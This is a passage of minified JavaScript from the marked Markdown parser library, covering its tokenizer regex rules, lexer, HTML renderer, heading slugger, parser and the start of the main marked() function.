Ce=X[0],X[0]=this.rules.inline._backpedal.exec(X[0])[0];while(Ce!==X[0]);G=N(X[0]),X[1]==="www."?te="http://"+X[0]:te=X[0]}return{type:"link",raw:X[0],text:G,href:te,tokens:[{type:"text",raw:G,text:G}]}}},ue.inlineText=function(L,F){var X=this.rules.inline.text.exec(L);if(X){var G;return this.lexer.state.inRawBlock?G=this.options.sanitize?this.options.sanitizer?this.options.sanitizer(X[0]):N(X[0]):X[0]:G=N(this.options.smartypants?F(X[0]):X[0]),{type:"text",raw:X[0],text:G}}},le}(),k={newline:/^(?: *(?:\n|$))+/,code:/^( {4}[^\n]+(?:\n(?: *(?:\n|$))*)?)+/,fences:/^ {0,3}(`{3,}(?=[^`\n]*(?:\n|$))|~{3,})([^\n]*)(?:\n|$)(?:|([\s\S]*?)(?:\n|$))(?: {0,3}\1[~`]* *(?=\n|$)|$)/,hr:/^ {0,3}((?:-[\t ]*){3,}|(?:_[ \t]*){3,}|(?:\*[ \t]*){3,})(?:\n+|$)/,heading:/^ {0,3}(#{1,6})(?=\s|$)(.*)(?:\n+|$)/,blockquote:/^( {0,3}> ?(paragraph|[^\n]*)(?:\n|$))+/,list:/^( {0,3}bull)([ \t][^\n]+?)?(?:\n|$)/,html:"^ {0,3}(?:<(script|pre|style|textarea)[\\s>][\\s\\S]*?(?:</\\1>[^\\n]*\\n+|$)|comment[^\\n]*(\\n+|$)|<\\?[\\s\\S]*?(?:\\?>\\n*|$)|<![A-Z][\\s\\S]*?(?:>\\n*|$)|<!\\[CDATA\\[[\\s\\S]*?(?:\\]\\]>\\n*|$)|</?(tag)(?: +|\\n|/?>)[\\s\\S]*?(?:(?:\\n *)+\\n|$)|<(?!script|pre|style|textarea)([a-z][\\w-]*)(?:attribute)*? */?>(?=[ \\t]*(?:\\n|$))[\\s\\S]*?(?:(?:\\n *)+\\n|$)|</(?!script|pre|style|textarea)[a-z][\\w-]*\\s*>(?=[ \\t]*(?:\\n|$))[\\s\\S]*?(?:(?:\\n *)+\\n|$))",def:/^ {0,3}\[(label)\]: *(?:\n *)?([^<\s][^\s]*|<.*?>)(?:(?: +(?:\n *)?| *\n *)(title))? *(?:\n+|$)/,table:ye,lheading:/^((?:.|\n(?!\n))+?)\n {0,3}(=+|-+) *(?:\n+|$)/,_paragraph:/^([^\n]+(?:\n(?!hr|heading|lheading|blockquote|fences|list|html|table| +\n)[^\n]+)*)/,text:/^[^\n]+/};k._label=/(?!\s*\])(?:\\.|[^\[\]\\])+/,k._title=/(?:"(?:\\"?|[^"\\])*"|'[^'\n]*(?:\n[^'\n]+)*\n?'|\([^()]*\))/,k.def=M(k.def).replace("label",k._label).replace("title",k._title).getRegex(),k.bullet=/(?:[*+-]|\d{1,9}[.)])/,k.listItemStart=M(/^( *)(bull) */).replace("bull",k.bullet).getRegex(),k.list=M(k.list).replace(/bull/g,k.bullet).replace("hr","\\n+(?=\\1?(?:(?:- *){3,}|(?:_ *){3,}|(?:\\* *){3,})(?:\\n+|$))").replace("def","\\n+(?="+k.def.source+")").getRegex(),k._tag="address|article|aside|base|basefont|blockquote|body|caption|center|col|colgroup|dd|details|dialog|dir|div|dl|dt|fieldset|figcaption|figure|footer|form|frame|frameset|h[1-6]|head|header|hr|html|iframe|legend|li|link|main|menu|menuitem|meta|nav|noframes|ol|optgroup|option|p|param|section|source|summary|table|tbody|td|tfoot|th|thead|title|tr|track|ul",k._comment=/<!--(?!-?>)[\s\S]*?(?:-->|$)/,k.html=M(k.html,"i").replace("comment",k._comment).replace("tag",k._tag).replace("attribute",/ +[a-zA-Z:_][\w.:-]*(?: *= *"[^"\n]*"| *= *'[^'\n]*'| *= *[^\s"'=<>`]+)?/).getRegex(),k.paragraph=M(k._paragraph).replace("hr",k.hr).replace("heading"," {0,3}#{1,6} ").replace("|lheading","").replace("|table","").replace("blockquote"," {0,3}>").replace("fences"," {0,3}(?:`{3,}(?=[^`\\n]*\\n)|~{3,})[^\\n]*\\n").replace("list"," {0,3}(?:[*+-]|1[.)]) ").replace("html","</?(?:tag)(?: +|\\n|/?>)|<(?:script|pre|style|textarea|!--)").replace("tag",k._tag).getRegex(),k.blockquote=M(k.blockquote).replace("paragraph",k.paragraph).getRegex(),k.normal=r({},k),k.gfm=r({},k.normal,{table:"^ *([^\\n ].*\\|.*)\\n {0,3}(?:\\| *)?(:?-+:? *(?:\\| *:?-+:? *)*)(?:\\| *)?(?:\\n((?:(?! *\\n|hr|heading|blockquote|code|fences|list|html).*(?:\\n|$))*)\\n*|$)"}),k.gfm.table=M(k.gfm.table).replace("hr",k.hr).replace("heading"," {0,3}#{1,6} ").replace("blockquote"," {0,3}>").replace("code"," {4}[^\\n]").replace("fences"," {0,3}(?:`{3,}(?=[^`\\n]*\\n)|~{3,})[^\\n]*\\n").replace("list"," {0,3}(?:[*+-]|1[.)]) ").replace("html","</?(?:tag)(?: +|\\n|/?>)|<(?:script|pre|style|textarea|!--)").replace("tag",k._tag).getRegex(),k.gfm.paragraph=M(k._paragraph).replace("hr",k.hr).replace("heading"," {0,3}#{1,6} ").replace("|lheading","").replace("table",k.gfm.table).replace("blockquote"," {0,3}>").replace("fences"," {0,3}(?:`{3,}(?=[^`\\n]*\\n)|~{3,})[^\\n]*\\n").replace("list"," {0,3}(?:[*+-]|1[.)]) ").replace("html","</?(?:tag)(?: +|\\n|/?>)|<(?:script|pre|style|textarea|!--)").replace("tag",k._tag).getRegex(),k.pedantic=r({},k.normal,{html:M(`^ *(?:comment *(?:\\n|\\s*$)|<(tag)[\\s\\S]+?</\\1> *(?:\\n{2,}|\\s*$)|<tag(?:"[^"]*"|'[^']*'|\\s[^'"/>\\s]*)*?/?> *(?:\\n{2,}|\\s*$))`).replace("comment",k._comment).replace(/tag/g,"(?!(?:a|em|strong|small|s|cite|q|dfn|abbr|data|time|code|var|samp|kbd|sub|sup|i|b|u|mark|ruby|rt|rp|bdi|bdo|span|br|wbr|ins|del|img)\\b)\\w+(?!:|[^\\w\\s@]*@)\\b").getRegex(),def:/^ *\[([^\]]+)\]: *<?([^\s>]+)>?(?: +(["(][^\n]+[")]))? *(?:\n+|$)/,heading:/^(#{1,6})(.*)(?:\n+|$)/,fences:ye,lheading:/^(.+?)\n {0,3}(=+|-+) *(?:\n+|$)/,paragraph:M(k.normal._paragraph).replace("hr",k.hr).replace("heading",` *#{1,6} *[^
]`).replace("lheading",k.lheading).replace("blockquote"," {0,3}>").replace("|fences","").replace("|list","").replace("|html","").getRegex()});var se={escape:/^\\([!"#$%&'()*+,\-./:;<=>?@\[\]\\^_`{|}~])/,autolink:/^<(scheme:[^\s\x00-\x1f<>]*|email)>/,url:ye,tag:"^comment|^</[a-zA-Z][\\w:-]*\\s*>|^<[a-zA-Z][\\w-]*(?:attribute)*?\\s*/?>|^<\\?[\\s\\S]*?\\?>|^<![a-zA-Z]+\\s[\\s\\S]*?>|^<!\\[CDATA\\[[\\s\\S]*?\\]\\]>",link:/^!?\[(label)\]\(\s*(href)(?:\s+(title))?\s*\)/,reflink:/^!?\[(label)\]\[(ref)\]/,nolink:/^!?\[(ref)\](?:\[\])?/,reflinkSearch:"reflink|nolink(?!\\()",emStrong:{lDelim:/^(?:\*+(?:([punct_])|[^\s*]))|^_+(?:([punct*])|([^\s_]))/,rDelimAst:/^(?:[^_*\\]|\\.)*?\_\_(?:[^_*\\]|\\.)*?\*(?:[^_*\\]|\\.)*?(?=\_\_)|(?:[^*\\]|\\.)+(?=[^*])|[punct_](\*+)(?=[\s]|$)|(?:[^punct*_\s\\]|\\.)(\*+)(?=[punct_\s]|$)|[punct_\s](\*+)(?=[^punct*_\s])|[\s](\*+)(?=[punct_])|[punct_](\*+)(?=[punct_])|(?:[^punct*_\s\\]|\\.)(\*+)(?=[^punct*_\s])/,rDelimUnd:/^(?:[^_*\\]|\\.)*?\*\*(?:[^_*\\]|\\.)*?\_(?:[^_*\\]|\\.)*?(?=\*\*)|(?:[^_\\]|\\.)+(?=[^_])|[punct*](\_+)(?=[\s]|$)|(?:[^punct*_\s\\]|\\.)(\_+)(?=[punct*\s]|$)|[punct*\s](\_+)(?=[^punct*_\s])|[\s](\_+)(?=[punct*])|[punct*](\_+)(?=[punct*])/},code:/^(`+)([^`]|[^`][\s\S]*?[^`])\1(?!`)/,br:/^( {2,}|\\)\n(?!\s*$)/,del:ye,text:/^(`+|[^`])(?:(?= {2,}\n)|[\s\S]*?(?:(?=[\\<!\[`*_]|\b_|$)|[^ ](?= {2,}\n)))/,punctuation:/^([\spunctuation])/};se._punctuation="!\"#$%&'()+\\-.,/:;<=>?@\\[\\]`^{|}~",se.punctuation=M(se.punctuation).replace(/punctuation/g,se._punctuation).getRegex(),se.blockSkip=/\[[^\]]*?\]\([^\)]*?\)|`[^`]*?`|<[^>]*?>/g,se.escapedEmSt=/(?:^|[^\\])(?:\\\\)*\\[*_]/g,se._comment=M(k._comment).replace("(?:-->|$)","-->").getRegex(),se.emStrong.lDelim=M(se.emStrong.lDelim).replace(/punct/g,se._punctuation).getRegex(),se.emStrong.rDelimAst=M(se.emStrong.rDelimAst,"g").replace(/punct/g,se._punctuation).getRegex(),se.emStrong.rDelimUnd=M(se.emStrong.rDelimUnd,"g").replace(/punct/g,se._punctuation).getRegex(),se._escapes=/\\([!"#$%&'()*+,\-./:;<=>?@\[\]\\^_`{|}~])/g,se._scheme=/[a-zA-Z][a-zA-Z0-9+.-]{1,31}/,se._email=/[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+(@)[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)+(?![-_])/,se.autolink=M(se.autolink).replace("scheme",se._scheme).replace("email",se._email).getRegex(),se._attribute=/\s+[a-zA-Z:_][\w.:-]*(?:\s*=\s*"[^"]*"|\s*=\s*'[^']*'|\s*=\s*[^\s"'=<>`]+)?/,se.tag=M(se.tag).replace("comment",se._comment).replace("attribute",se._attribute).getRegex(),se._label=/(?:\[(?:\\.|[^\[\]\\])*\]|\\.|`[^`]*`|[^\[\]\\`])*?/,se._href=/<(?:\\.|[^\n<>\\])+>|[^\s\x00-\x1f]*/,se._title=/"(?:\\"?|[^"\\])*"|'(?:\\'?|[^'\\])*'|\((?:\\\)?|[^)\\])*\)/,se.link=M(se.link).replace("label",se._label).replace("href",se._href).replace("title",se._title).getRegex(),se.reflink=M(se.reflink).replace("label",se._label).replace("ref",k._label).getRegex(),se.nolink=M(se.nolink).replace("ref",k._label).getRegex(),se.reflinkSearch=M(se.reflinkSearch,"g").replace("reflink",se.reflink).replace("nolink",se.nolink).getRegex(),se.normal=r({},se),se.pedantic=r({},se.normal,{strong:{start:/^__|\*\*/,middle:/^__(?=\S)([\s\S]*?\S)__(?!_)|^\*\*(?=\S)([\s\S]*?\S)\*\*(?!\*)/,endAst:/\*\*(?!\*)/g,endUnd:/__(?!_)/g},em:{start:/^_|\*/,middle:/^()\*(?=\S)([\s\S]*?\S)\*(?!\*)|^_(?=\S)([\s\S]*?\S)_(?!_)/,endAst:/\*(?!\*)/g,endUnd:/_(?!_)/g},link:M(/^!?\[(label)\]\((.*?)\)/).replace("label",se._label).getRegex(),reflink:M(/^!?\[(label)\]\s*\[([^\]]*)\]/).replace("label",se._label).getRegex()}),se.gfm=r({},se.normal,{escape:M(se.escape).replace("])","~|])").getRegex(),_extended_email:/[A-Za-z0-9._+-]+(@)[a-zA-Z0-9-_]+(?:\.[a-zA-Z0-9-_]*[a-zA-Z0-9])+(?![-_])/,url:/^((?:ftp|https?):\/\/|www\.)(?:[a-zA-Z0-9\-]+\.?)+[^\s<]*|^email/,_backpedal:/(?:[^?!.,:;*_'"~()&]+|\([^)]*\)|&(?![a-zA-Z0-9]+;$)|[?!.,:;*_'"~)]+(?!$))+/,del:/^(~~?)(?=[^\s~])([\s\S]*?[^\s~])\1(?=[^~]|$)/,text:/^([`~]+|[^`~])(?:(?= {2,}\n)|(?=[a-zA-Z0-9.!#$%&'*+\/=?_`{\|}~-]+@)|[\s\S]*?(?:(?=[\\<!\[`*~_]|\b_|https?:\/\/|ftp:\/\/|www\.|$)|[^ ](?= {2,}\n)|[^a-zA-Z0-9.!#$%&'*+\/=?_`{\|}~-](?=[a-zA-Z0-9.!#$%&'*+\/=?_`{\|}~-]+@)))/}),se.gfm.url=M(se.gfm.url,"i").replace("email",se.gfm._extended_email).getRegex(),se.breaks=r({},se.gfm,{br:M(se.br).replace("{2,}","*").getRegex(),text:M(se.gfm.text).replace("\\b_","\\b_| {2,}\\n").replace(/\{2,\}/g,"*").getRegex()});function Ve(le){return le.replace(/---/g,"").replace(/--/g,"").replace(/(^|[-\u2014/(\[{"\s])'/g,"$1").replace(/'/g,"").replace(/(^|[-\u2014/(\[{\u2018\s])"/g,"$1").replace(/"/g,"").replace(/\.{3}/g,"")}function De(le){var ue="",H,L,F=le.length;for(H=0;H<F;H++)L=le.charCodeAt(H),Math.random()>.5&&(L="x"+L.toString(16)),ue+="&#"+L+";";return ue}var Ke=function(){function le(H){this.tokens=[],this.tokens.links=Object.create(null),this.options=H||e.defaults,this.options.tokenizer=this.options.tokenizer||new Q,this.tokenizer=this.options.tokenizer,this.tokenizer.options=this.options,this.tokenizer.lexer=this,this.inlineQueue=[],this.state={inLink:!1,inRawBlock:!1,top:!0};var L={block:k.normal,inline:se.normal};this.options.pedantic?(L.block=k.pedantic,L.inline=se.pedantic):this.options.gfm&&(L.block=k.gfm,this.options.breaks?L.inline=se.breaks:L.inline=se.gfm),this.tokenizer.rules=L}le.lex=function(L,F){var X=new le(F);return X.lex(L)},le.lexInline=function(L,F){var X=new le(F);return X.inlineTokens(L)};var ue=le.prototype;return ue.lex=function(L){L=L.replace(/\r\n|\r/g,`
`),this.blockTokens(L,this.tokens);for(var F;F=this.inlineQueue.shift();)this.inlineTokens(F.src,F.tokens);return this.tokens},ue.blockTokens=function(L,F){var X=this;F===void 0&&(F=[]),this.options.pedantic?L=L.replace(/\t/g,"    ").replace(/^ +$/gm,""):L=L.replace(/^( *)(\t+)/gm,function(Be,Ue,Le){return Ue+"    ".repeat(Le.length)});for(var G,te,Ce,je;L;)if(!(this.options.extensions&&this.options.extensions.block&&this.options.extensions.block.some(function(Be){return(G=Be.call({lexer:X},L,F))?(L=L.substring(G.raw.length),F.push(G),!0):!1}))){if(G=this.tokenizer.space(L)){L=L.substring(G.raw.length),G.raw.length===1&&F.length>0?F[F.length-1].raw+=`
`:F.push(G);continue}if(G=this.tokenizer.code(L)){L=L.substring(G.raw.length),te=F[F.length-1],te&&(te.type==="paragraph"||te.type==="text")?(te.raw+=`
`+G.raw,te.text+=`
`+G.text,this.inlineQueue[this.inlineQueue.length-1].src=te.text):F.push(G);continue}if(G=this.tokenizer.fences(L)){L=L.substring(G.raw.length),F.push(G);continue}if(G=this.tokenizer.heading(L)){L=L.substring(G.raw.length),F.push(G);continue}if(G=this.tokenizer.hr(L)){L=L.substring(G.raw.length),F.push(G);continue}if(G=this.tokenizer.blockquote(L)){L=L.substring(G.raw.length),F.push(G);continue}if(G=this.tokenizer.list(L)){L=L.substring(G.raw.length),F.push(G);continue}if(G=this.tokenizer.html(L)){L=L.substring(G.raw.length),F.push(G);continue}if(G=this.tokenizer.def(L)){L=L.substring(G.raw.length),te=F[F.length-1],te&&(te.type==="paragraph"||te.type==="text")?(te.raw+=`
`+G.raw,te.text+=`
`+G.raw,this.inlineQueue[this.inlineQueue.length-1].src=te.text):this.tokens.links[G.tag]||(this.tokens.links[G.tag]={href:G.href,title:G.title});continue}if(G=this.tokenizer.table(L)){L=L.substring(G.raw.length),F.push(G);continue}if(G=this.tokenizer.lheading(L)){L=L.substring(G.raw.length),F.push(G);continue}if(Ce=L,this.options.extensions&&this.options.extensions.startBlock&&function(){var Be=1/0,Ue=L.slice(1),Le=void 0;X.options.extensions.startBlock.forEach(function(qe){Le=qe.call({lexer:this},Ue),typeof Le=="number"&&Le>=0&&(Be=Math.min(Be,Le))}),Be<1/0&&Be>=0&&(Ce=L.substring(0,Be+1))}(),this.state.top&&(G=this.tokenizer.paragraph(Ce))){te=F[F.length-1],je&&te.type==="paragraph"?(te.raw+=`
`+G.raw,te.text+=`
`+G.text,this.inlineQueue.pop(),this.inlineQueue[this.inlineQueue.length-1].src=te.text):F.push(G),je=Ce.length!==L.length,L=L.substring(G.raw.length);continue}if(G=this.tokenizer.text(L)){L=L.substring(G.raw.length),te=F[F.length-1],te&&te.type==="text"?(te.raw+=`
`+G.raw,te.text+=`
`+G.text,this.inlineQueue.pop(),this.inlineQueue[this.inlineQueue.length-1].src=te.text):F.push(G);continue}if(L){var Re="Infinite loop on byte: "+L.charCodeAt(0);if(this.options.silent){console.error(Re);break}else throw new Error(Re)}}return this.state.top=!0,F},ue.inline=function(L,F){return F===void 0&&(F=[]),this.inlineQueue.push({src:L,tokens:F}),F},ue.inlineTokens=function(L,F){var X=this;F===void 0&&(F=[]);var G,te,Ce,je=L,Re,Be,Ue;if(this.tokens.links){var Le=Object.keys(this.tokens.links);if(Le.length>0)for(;(Re=this.tokenizer.rules.inline.reflinkSearch.exec(je))!=null;)Le.includes(Re[0].slice(Re[0].lastIndexOf("[")+1,-1))&&(je=je.slice(0,Re.index)+"["+xe("a",Re[0].length-2)+"]"+je.slice(this.tokenizer.rules.inline.reflinkSearch.lastIndex))}for(;(Re=this.tokenizer.rules.inline.blockSkip.exec(je))!=null;)je=je.slice(0,Re.index)+"["+xe("a",Re[0].length-2)+"]"+je.slice(this.tokenizer.rules.inline.blockSkip.lastIndex);for(;(Re=this.tokenizer.rules.inline.escapedEmSt.exec(je))!=null;)je=je.slice(0,Re.index+Re[0].length-2)+"++"+je.slice(this.tokenizer.rules.inline.escapedEmSt.lastIndex),this.tokenizer.rules.inline.escapedEmSt.lastIndex--;for(;L;)if(Be||(Ue=""),Be=!1,!(this.options.extensions&&this.options.extensions.inline&&this.options.extensions.inline.some(function(fe){return(G=fe.call({lexer:X},L,F))?(L=L.substring(G.raw.length),F.push(G),!0):!1}))){if(G=this.tokenizer.escape(L)){L=L.substring(G.raw.length),F.push(G);continue}if(G=this.tokenizer.tag(L)){L=L.substring(G.raw.length),te=F[F.length-1],te&&G.type==="text"&&te.type==="text"?(te.raw+=G.raw,te.text+=G.text):F.push(G);continue}if(G=this.tokenizer.link(L)){L=L.substring(G.raw.length),F.push(G);continue}if(G=this.tokenizer.reflink(L,this.tokens.links)){L=L.substring(G.raw.length),te=F[F.length-1],te&&G.type==="text"&&te.type==="text"?(te.raw+=G.raw,te.text+=G.text):F.push(G);continue}if(G=this.tokenizer.emStrong(L,je,Ue)){L=L.substring(G.raw.length),F.push(G);continue}if(G=this.tokenizer.codespan(L)){L=L.substring(G.raw.length),F.push(G);continue}if(G=this.tokenizer.br(L)){L=L.substring(G.raw.length),F.push(G);continue}if(G=this.tokenizer.del(L)){L=L.substring(G.raw.length),F.push(G);continue}if(G=this.tokenizer.autolink(L,De)){L=L.substring(G.raw.length),F.push(G);continue}if(!this.state.inLink&&(G=this.tokenizer.url(L,De))){L=L.substring(G.raw.length),F.push(G);continue}if(Ce=L,this.options.extensions&&this.options.extensions.startInline&&function(){var fe=1/0,Et=L.slice(1),gt=void 0;X.options.extensions.startInline.forEach(function(xt){gt=xt.call({lexer:this},Et),typeof gt=="number"&&gt>=0&&(fe=Math.min(fe,gt))}),fe<1/0&&fe>=0&&(Ce=L.substring(0,fe+1))}(),G=this.tokenizer.inlineText(Ce,Ve)){L=L.substring(G.raw.length),G.raw.slice(-1)!=="_"&&(Ue=G.raw.slice(-1)),Be=!0,te=F[F.length-1],te&&te.type==="text"?(te.raw+=G.raw,te.text+=G.text):F.push(G);continue}if(L){var qe="Infinite loop on byte: "+L.charCodeAt(0);if(this.options.silent){console.error(qe);break}else throw new Error(qe)}}return F},n(le,null,[{key:"rules",get:function(){return{block:k,inline:se}}}]),le}(),vt=function(){function le(H){this.options=H||e.defaults}var ue=le.prototype;return ue.code=function(L,F,X){var G=(F||"").match(/\S*/)[0];if(this.options.highlight){var te=this.options.highlight(L,G);te!=null&&te!==L&&(X=!0,L=te)}return L=L.replace(/\n$/,"")+`
`,G?'<pre><code class="'+this.options.langPrefix+N(G)+'">'+(X?L:N(L,!0))+`</code></pre>
`:"<pre><code>"+(X?L:N(L,!0))+`</code></pre>
`},ue.blockquote=function(L){return`<blockquote>
`+L+`</blockquote>
`},ue.html=function(L){return L},ue.heading=function(L,F,X,G){if(this.options.headerIds){var te=this.options.headerPrefix+G.slug(X);return"<h"+F+' id="'+te+'">'+L+"</h"+F+`>
`}return"<h"+F+">"+L+"</h"+F+`>
`},ue.hr=function(){return this.options.xhtml?`<hr/>
`:`<hr>
`},ue.list=function(L,F,X){var G=F?"ol":"ul",te=F&&X!==1?' start="'+X+'"':"";return"<"+G+te+`>
`+L+"</"+G+`>
`},ue.listitem=function(L){return"<li>"+L+`</li>
`},ue.checkbox=function(L){return"<input "+(L?'checked="" ':"")+'disabled="" type="checkbox"'+(this.options.xhtml?" /":"")+"> "},ue.paragraph=function(L){return"<p>"+L+`</p>
`},ue.table=function(L,F){return F&&(F="<tbody>"+F+"</tbody>"),`<table>
<thead>
`+L+`</thead>
`+F+`</table>
`},ue.tablerow=function(L){return`<tr>
`+L+`</tr>
`},ue.tablecell=function(L,F){var X=F.header?"th":"td",G=F.align?"<"+X+' align="'+F.align+'">':"<"+X+">";return G+L+("</"+X+`>
`)},ue.strong=function(L){return"<strong>"+L+"</strong>"},ue.em=function(L){return"<em>"+L+"</em>"},ue.codespan=function(L){return"<code>"+L+"</code>"},ue.br=function(){return this.options.xhtml?"<br/>":"<br>"},ue.del=function(L){return"<del>"+L+"</del>"},ue.link=function(L,F,X){if(L=U(this.options.sanitize,this.options.baseUrl,L),L===null)return X;var G='<a href="'+L+'"';return F&&(G+=' title="'+F+'"'),G+=">"+X+"</a>",G},ue.image=function(L,F,X){if(L=U(this.options.sanitize,this.options.baseUrl,L),L===null)return X;var G='<img src="'+L+'" alt="'+X+'"';return F&&(G+=' title="'+F+'"'),G+=this.options.xhtml?"/>":">",G},ue.text=function(L){return L},le}(),lt=function(){function le(){}var ue=le.prototype;return ue.strong=function(L){return L},ue.em=function(L){return L},ue.codespan=function(L){return L},ue.del=function(L){return L},ue.html=function(L){return L},ue.text=function(L){return L},ue.link=function(L,F,X){return""+X},ue.image=function(L,F,X){return""+X},ue.br=function(){return""},le}(),Tt=function(){function le(){this.seen={}}var ue=le.prototype;return ue.serialize=function(L){return L.toLowerCase().trim().replace(/<[!\/a-z].*?>/ig,"").replace(/[\u2000-\u206F\u2E00-\u2E7F\\'!"#$%&()*+,./:;<=>?@[\]^`{|}~]/g,"").replace(/\s/g,"-")},ue.getNextSafeSlug=function(L,F){var X=L,G=0;if(this.seen.hasOwnProperty(X)){G=this.seen[L];do G++,X=L+"-"+G;while(this.seen.hasOwnProperty(X))}return F||(this.seen[L]=G,this.seen[X]=0),X},ue.slug=function(L,F){F===void 0&&(F={});var X=this.serialize(L);return this.getNextSafeSlug(X,F.dryrun)},le}(),ut=function(){function le(H){this.options=H||e.defaults,this.options.renderer=this.options.renderer||new vt,this.renderer=this.options.renderer,this.renderer.options=this.options,this.textRenderer=new lt,this.slugger=new Tt}le.parse=function(L,F){var X=new le(F);return X.parse(L)},le.parseInline=function(L,F){var X=new le(F);return X.parseInline(L)};var ue=le.prototype;return ue.parse=function(L,F){F===void 0&&(F=!0);var X="",G,te,Ce,je,Re,Be,Ue,Le,qe,fe,Et,gt,xt,tt,rn,gn,Cr,Bt,pi,mi=L.length;for(G=0;G<mi;G++){if(fe=L[G],this.options.extensions&&this.options.extensions.renderers&&this.options.extensions.renderers[fe.type]&&(pi=this.options.extensions.renderers[fe.type].call({parser:this},fe),pi!==!1||!["space","hr","heading","code","table","blockquote","list","html","paragraph","text"].includes(fe.type))){X+=pi||"";continue}switch(fe.type){case"space":continue;case"hr":{X+=this.renderer.hr();continue}case"heading":{X+=this.renderer.heading(this.parseInline(fe.tokens),fe.depth,A(this.parseInline(fe.tokens,this.textRenderer)),this.slugger);continue}case"code":{X+=this.renderer.code(fe.text,fe.lang,fe.escaped);continue}case"table":{for(Le="",Ue="",je=fe.header.length,te=0;te<je;te++)Ue+=this.renderer.tablecell(this.parseInline(fe.header[te].tokens),{header:!0,align:fe.align[te]});for(Le+=this.renderer.tablerow(Ue),qe="",je=fe.rows.length,te=0;te<je;te++){for(Be=fe.rows[te],Ue="",Re=Be.length,Ce=0;Ce<Re;Ce++)Ue+=this.renderer.tablecell(this.parseInline(Be[Ce].tokens),{header:!1,align:fe.align[Ce]});qe+=this.renderer.tablerow(Ue)}X+=this.renderer.table(Le,qe);continue}case"blockquote":{qe=this.parse(fe.tokens),X+=this.renderer.blockquote(qe);continue}case"list":{for(Et=fe.ordered,gt=fe.start,xt=fe.loose,je=fe.items.length,qe="",te=0;te<je;te++)rn=fe.items[te],gn=rn.checked,Cr=rn.task,tt="",rn.task&&(Bt=this.renderer.checkbox(gn),xt?rn.tokens.length>0&&rn.tokens[0].type==="paragraph"?(rn.tokens[0].text=Bt+" "+rn.tokens[0].text,rn.tokens[0].tokens&&rn.tokens[0].tokens.length>0&&rn.tokens[0].tokens[0].type==="text"&&(rn.tokens[0].tokens[0].text=Bt+" "+rn.tokens[0].tokens[0].text)):rn.tokens.unshift({type:"text",text:Bt}):tt+=Bt),tt+=this.parse(rn.tokens,xt),qe+=this.renderer.listitem(tt,Cr,gn);X+=this.renderer.list(qe,Et,gt);continue}case"html":{X+=this.renderer.html(fe.text);continue}case"paragraph":{X+=this.renderer.paragraph(this.parseInline(fe.tokens));continue}case"text":{for(qe=fe.tokens?this.parseInline(fe.tokens):fe.text;G+1<mi&&L[G+1].type==="text";)fe=L[++G],qe+=`
`+(fe.tokens?this.parseInline(fe.tokens):fe.text);X+=F?this.renderer.paragraph(qe):qe;continue}default:{var Mr='Token with "'+fe.type+'" type was not found.';if(this.options.silent){console.error(Mr);return}else throw new Error(Mr)}}}return X},ue.parseInline=function(L,F){F=F||this.renderer;var X="",G,te,Ce,je=L.length;for(G=0;G<je;G++){if(te=L[G],this.options.extensions&&this.options.extensions.renderers&&this.options.extensions.renderers[te.type]&&(Ce=this.options.extensions.renderers[te.type].call({parser:this},te),Ce!==!1||!["escape","html","link","image","strong","em","codespan","br","del","text"].includes(te.type))){X+=Ce||"";continue}switch(te.type){case"escape":{X+=F.text(te.text);break}case"html":{X+=F.html(te.text);break}case"link":{X+=F.link(te.href,te.title,this.parseInline(te.tokens,F));break}case"image":{X+=F.image(te.href,te.title,te.text);break}case"strong":{X+=F.strong(this.parseInline(te.tokens,F));break}case"em":{X+=F.em(this.parseInline(te.tokens,F));break}case"codespan":{X+=F.codespan(te.text);break}case"br":{X+=F.br();break}case"del":{X+=F.del(this.parseInline(te.tokens,F));break}case"text":{X+=F.text(te.text);break}default:{var Re='Token with "'+te.type+'" type was not found.';if(this.options.silent){console.error(Re);return}else throw new Error(Re)}}}return X},le}(),bt=function(){function le(H){this.options=H||e.defaults}var ue=le.prototype;return ue.preprocess=function(L){return L},ue.postprocess=function(L){return L},le}();bt.passThroughHooks=new Set(["preprocess","postprocess"]);function Mt(le,ue,H){return function(L){if(L.message+=`
Please report this to https://github.com/markedjs/marked.`,le){var F="<p>An error occurred:</p><pre>"+N(L.message+"",!0)+"</pre>";if(ue)return Promise.resolve(F);if(H){H(null,F);return}return F}if(ue)return Promise.reject(L);if(H){H(L);return}throw L}}function nn(le,ue){return function(H,L,F){typeof L=="function"&&(F=L,L=null);var X=r({},L);L=r({},$e.defaults,X);var G=Mt(L.silent,L.async,F);if(typeof H>"u"||H===null)return G(new Error("marked(): input parameter is undefined or null"));if(typeof H!="string")return G(new Error("marked(): input parameter is of type "+Object.prototype.toString.call(H)+", string expected"));if(ae(L),L.hooks&&(L.hooks.options=L),F){var te=L.highlight,Ce;try{L.hooks&&(H=L.hooks.preprocess(H)),Ce=le(H,L)}catch(Le){return G(Le)}var je=function(qe){var fe;if(!qe)try{L.walkTokens&&$e.walkTokens(Ce,L.walkTokens),fe=ue(Ce,L),L.hooks&&(fe=L.hooks.postprocess(fe))}catch(Et){qe=Et}return L.highlight=te,qe?G(qe):F(null,fe)};if(!te||te.length<3||(delete L.highlight,!Ce.length))return je();var Re=0;$e.walkTokens(Ce,function(Le){Le.type==="code"&&(Re++,setTimeout(function(){te(Le.text,Le.lang,function(qe,fe){if(qe)return je(qe);fe!=null&&fe!==Le.text&&(Le.text=fe,Le.escaped=!0),Re--,Re===0&&je()})},0))}),Re===0&&je();return}if(L.async)return Promise.resolve(L.hooks?L.hooks.preprocess(H):H).then(function(Le){return le(Le,L)}).then(function(Le){return L.walkTokens?Promise.all($e.walkTokens(Le,L.walkTokens)).then(function(){return Le}):Le}).then(function(Le){return ue(Le,L)}).then(function(Le){return L.hooks?L.hooks.postprocess(Le):Le}).catch(G);try{L.hooks&&(H=L.hooks.preprocess(H));var Be=le(H,L);L.walkTokens&&$e.walkTokens(Be,L.walkTokens);var Ue=ue(Be,L);return L.hooks&&(Ue=L.hooks.postprocess(Ue)),Ue}catch(Le){return G(Le)}}}function $e(le,ue,H){return nn(Ke.lex,ut.parse)(le,ue,H)}$e.options=$e.setOptions=function(le){return $e.defaults=r({},$e.defaults,le),x($e.defaults),$e},$e.getDefaults=m,$e.defaults=e.defaults,$e.use=function(){for(var le=$e.defaults.extensions||{renderers:{},childTokens:{}},ue=arguments.length,H=new Array(ue),L=0;L<ue;L++)H[L]=arguments[L];H.forEach(function(F){var 